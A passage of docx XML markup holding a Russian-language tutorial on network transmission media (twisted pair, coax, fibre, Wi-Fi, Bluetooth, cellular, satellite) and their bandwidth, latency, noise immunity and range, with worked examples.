        <w:t>**Cat6a** — до 10 Гбит/с на 100 м, частота 500 МГц.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Cat7** — до 10 Гбит/с, частота 600 МГц, обязательно экранированная.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Cat8** — до 40 Гбит/с на 30 м, частота 2000 МГц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример расчёта</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Твой офис 80 метров в длину. Хочешь 10 Гбит/с между серверной и рабочими местами. Нужен кабель </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cat6a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cat7</w:t>
      </w:r>
      <w:r>
        <w:t>. Cat6 не подойдёт (только 55 м для 10 Гбит/с).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Коннектор</w:t>
      </w:r>
      <w:r>
        <w:t>: RJ-45 (8P8C) — тот самый "интернетный" разъём.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ограничения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Максимальная длина — **100 метров** (без репитера/свитча).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Чувствительность к электромагнитным помехам (особенно UTP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1.2. Коаксиальный кабель (Coaxial)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Старая технология. Состоит из центрального проводника, изоляции, экрана и внешней оболочки. Раньше использовался в сетях Ethernet (10BASE2, 10BASE5), сейчас — в основном для кабельного ТВ и интернета (DOCSIS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: до 1 Гбит/с (DOCSIS 3.1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Длина: до 500 метров (10BASE5) или 185 метров (10BASE2).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Помехоустойчивость: лучше, чем у витой пары.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В локальных сетях </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>устарел</w:t>
      </w:r>
      <w:r>
        <w:t>. Витая пара и оптоволокно рулят.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1.3. Оптоволокно (Fiber Optic) — скорость света буквально</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Оптоволокно передаёт данные с помощью </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>света</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (лазера или светодиода). Это самая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>быстрая</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>защищённая</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> среда передачи данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Одномодовое (Single-Mode, SMF)** — тонкое ядро (9 мкм), один луч света, дальность до **100 км** (и больше с усилителями), скорость до 100 Гбит/с и выше. Используется для магистралей (между городами, подводные кабели).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Многомодовое (Multi-Mode, MMF)** — толстое ядро (50 или 62.5 мкм), несколько лучей, дальность до **2 км**, скорость до 10 Гбит/с. Используется внутри зданий, дата-центров.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Огромная пропускная способность** — до 100 Гбит/с и выше (400G, 800G уже существуют).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дальность** — десятки и сотни километров.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Защита от помех** — свет не реагирует на электромагнитные помехи.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасность** — нельзя "подслушать" без физического доступа (в отличие от меди).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дорого** — само волокно, коннекторы, оборудование.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложный монтаж** — нужна сварка (фьюжн) или механические коннекторы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хрупкость** — нельзя сильно гнуть (минимальный радиус изгиба ~30 мм).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Коннекторы</w:t>
      </w:r>
      <w:r>
        <w:t>: LC, SC, ST, FC, MTP/MPO (для многоволоконных кабелей).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Подключил сервер в ЦОДе к свитчу через оптоволокно LC-LC (многомодовое OM4). Дистанция 300 метров, скорость 10 Гбит/с. На витой паре такое не провернёшь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2. Беспроводные среды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.1. Wi-Fi (IEEE 802.11)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Самая популярная беспроводная технология для локальных сетей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стандарты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Стандарт  | Год  | Частота      | Макс. скорость | Дальность (в помещении) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|------|--------------|----------------|-------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 802.11b   | 1999 | 2.4 ГГц      | 11 Мбит/с      | ~30 м                   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 802.11g   | 2003 | 2.4 ГГц      | 54 Мбит/с      | ~30 м                   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 802.11n   | 2009 | 2.4/5 ГГц    | 600 Мбит/с     | ~50 м (2.4 ГГц)         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 802.11ac  | 2013 | 5 ГГц        | 3.5 Гбит/с     | ~30 м                   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 802.11ax  | 2019 | 2.4/5/6 ГГц  | 9.6 Гбит/с     | ~30 м                   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Частоты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2.4 ГГц** — дальше проникает через стены, но медленнее. Забита соседскими роутерами (только 3 неперекрывающихся канала: 1, 6, 11).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**5 ГГц** — быстрее, больше каналов (19-25), но меньше дальность. Не проходит через стены.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**6 ГГц** (Wi-Fi 6E) — ещё больше каналов, меньше помех, но дальность ещё хуже.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Твой роутер с Wi-Fi 5 (802.11ac) выдаёт на бумаге 1.3 Гбит/с. На практике с телефона получишь ~400-500 Мбит/с на расстоянии 5 метров. Через две стены — уже 50-100 Мбит/с.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.2. Bluetooth</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>коротких дистанций</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (до 10-100 метров, в зависимости от версии). Используется для беспроводных наушников, клавиатур, мышек, смартфонов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Версии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Bluetooth 4.0 (BLE — Low Energy)** — до 1 Мбит/с, низкое энергопотребление.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Bluetooth 5.0** — до 2 Мбит/с, дальность до 200 м (на открытом пространстве).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Твои AirPods используют Bluetooth 5.0. Качество звука зависит от кодека (AAC, aptX, LDAC). Максимальная скорость ~1-2 Мбит/с, что достаточно для музыки, но не для видео 4K.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.3. Мобильная связь (3G, 4G LTE, 5G)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для интернета через сотовую сеть.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Поколение | Год  | Скорость (теория)     | Скорость (практика) | Латентность |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|------|-----------------------|---------------------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3G        | 2000 | 2-42 Мбит/с           | 1-5 Мбит/с          | 100-500 мс  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4G LTE    | 2010 | 100-300 Мбит/с        | 20-100 Мбит/с       | 30-50 мс    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 5G        | 2020 | 1-10 Гбит/с           | 100-500 Мбит/с      | 1-10 мс     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: На даче нет проводного интернета. Вкупил 4G-модем Huawei B535. Провайдер обещает "до 150 Мбит/с", по факту получаешь 30-50 Мбит/с (зависит от удалённости от вышки, загруженности сети, погоды).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.4. Спутниковая связь (Satellite)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>удалённых</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> мест, где нет ни проводов, ни мобильной связи (деревни, корабли, полярные станции).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Геостационарные спутники** (GEO) — высота ~36000 км, большая задержка (~500-700 мс), но широкое покрытие.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Низкоорбитальные спутники** (LEO) — высота ~500-2000 км, малая задержка (~20-40 мс). Пример: **Starlink** от SpaceX.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Подключился к Starlink. Скорость 100-200 Мбит/с (download), 10-30 Мбит/с (upload), пинг 20-50 мс. Но дорого (~$100/мес + $600 за оборудование).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Характеристики сред передачи данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1. Пропускная способность (Bandwidth)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>максимальная</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> скорость передачи данных. Измеряется в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>бит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (бит в секунду), Кбит/с, Мбит/с, Гбит/с.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Не путай с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>throughput</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (реальная скорость с учётом потерь и протоколов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Твой интернет-канал 500 Мбит/с. Это bandwidth. Но реальный throughput (что ты качаешь в торренте) будет ~450-470 Мбит/с из-за накладных расходов протоколов (TCP/IP, Ethernet headers).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.2. Задержка (Latency, Ping)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Время, за которое пакет доходит от отправителя до получателя. Измеряется в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>миллисекундах (мс)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Компоненты задержки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка распространения** — скорость света в среде (~200,000 км/с в оптоволокне vs 300,000 км/с в вакууме).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка передачи** — время, чтобы все биты пакета попали в канал (зависит от размера пакета и скорости канала).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка обработки** — маршрутизаторы, коммутаторы обрабатывают пакет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задержка в очереди** — если канал занят, пакет ждёт своей очереди.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Игры (CS:GO, Dota 2)** — нужен **низкий** пинг (&lt;50 мс).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стриминг Netflix** — пофиг на пинг, важен bandwidth.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Видеозвонки (Zoom)** — важен и пинг (&lt;100 мс), и стабильность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт</w:t>
      </w:r>
      <w:r>
        <w:t>: Пакет летит из Москвы в Нью-Йорк (~7500 км). Скорость света в оптоволокне ~200,000 км/с. Минимальная задержка: `7500 / 200000 = 0.0375 с = 37.5 мс`. Но с учётом маршрутизаторов, очередей — пинг ~100-150 мс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.3. Помехоустойчивость (Noise Immunity)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Способность среды </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> реагировать на внешние помехи (электромагнитные поля, радиоволны, соседние кабели).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рейтинг</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (от лучшего к худшему):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптоволокно** — не реагирует на EMI вообще.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Экранированная витая пара (STP)** — хорошая защита.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Неэкранированная витая пара (UTP)** — средняя защита (скручивание пар помогает).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Коаксиал** — неплохо, но уступает экранированной витой паре.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Беспроводные среды (Wi-Fi)** — помехи от соседских роутеров, микроволновок, Bluetooth-устройств.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В серверной стоят мощные блоки питания и кондиционеры (электромагнитные помехи). Используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>STP Cat6a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>оптоволокно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, а не UTP — иначе будут </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>потери пакетов</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.4. Дальность передачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Максимальное расстояние, на которое можно передать данные без усиления сигнала.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Витая пара** — 100 м (дальше нужен свитч/репитер).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Многомодовое оптоволокно** — 2 км.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Одномодовое оптоволокно** — 100+ км (с усилителями — тысячи км).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Wi-Fi 2.4 ГГц** — 50-100 м (в помещении).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Wi-Fi 5 ГГц** — 30-50 м (в помещении).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Bluetooth** — 10-100 м.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**4G LTE** — до 10 км (от вышки).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**5G** — до 1-2 км (высокочастотный mmWave).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Хочешь подключить склад (200 метров от офиса) к локальной сети. Варианты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Витая пара** — нужно 2 свитча посередине. Дорого и геморно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптоволокно** — один кабель, никаких усилителей. Дороже в монтаже, но надёжнее.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Wi-Fi** — поставить точку доступа на середине. Скорость будет хуже, зато дешевле.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Практические примеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Выбор кабеля для офиса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: В офисе нужно соединить 2 этажа (расстояние 60 метров по вертикали). Требуется скорость 10 Гбит/с. Какой кабель выбрать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Витая пара Cat6** — до 10 Гбит/с на расстоянии **до 55 м**. У нас 60 м → **не подходит**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
